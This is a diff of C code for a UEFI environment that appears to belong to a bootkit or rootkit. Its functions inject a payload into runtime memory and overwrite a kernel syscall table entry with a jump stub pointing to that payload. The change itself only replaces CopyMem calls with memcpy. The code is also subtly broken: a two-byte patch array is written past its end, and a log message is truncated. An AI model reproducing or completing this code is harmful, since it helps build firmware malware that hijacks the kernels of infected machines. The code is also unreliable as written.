@@ -1,3 +1,4 @@
+#include <string.h>
 #include "SyscallBridge.h"
 #include "Logger.h"
 #include "MemTools.h"
@@ -10,7 +11,7 @@ BOOLEAN InjectRuntimeHook(VOID* Payload, UINTN Size) {
     gRuntimePayload = EfiAlloc(Size);
     if (!gRuntimePayload) return FALSE;
 
-    CopyMem(gRuntimePayload, Payload, Size);
+    memcpy(gRuntimePayload, Payload, Size);
     gPayloadSize = Size;
     LogInfo(L"Payload injected into runtime memory.");
     return TRUE;
@@ -26,8 +27,8 @@ BOOLEAN PrepareSyscallPatch(VOID* KernelBase, UINTN TableOffset) {
     UINT8 Patch[] = { 0x48, 0xB8 }; // MOV RAX, ...
     VOID* Target = (UINT8*)KernelBase + TableOffset;
 
-    CopyMem(Patch + 2, &gRuntimePayload, sizeof(VOID*));
-    CopyMem(Target, Patch, sizeof(Patch) + sizeof(VOID*));
+    memcpy(Patch + 2, &gRuntimePayload, sizeof(VOID*));
+    memcpy(Target, Patch, sizeof(Patch) + sizeof(VOID*));
 
     LogInfo(L"Syscall patch .");
     return TRUE;
@@ -47,6 +48,6 @@ VOID WriteRuntimeData(VOID* Data, UINTN Size) {
     VOID* Dest = EfiAlloc(Size);
     if (!Dest) return;
 
-    CopyMem(Dest, Data, Size);
+    memcpy(Dest, Data, Size);
     LogInfo(L"Data written in runtime environment.");
 }
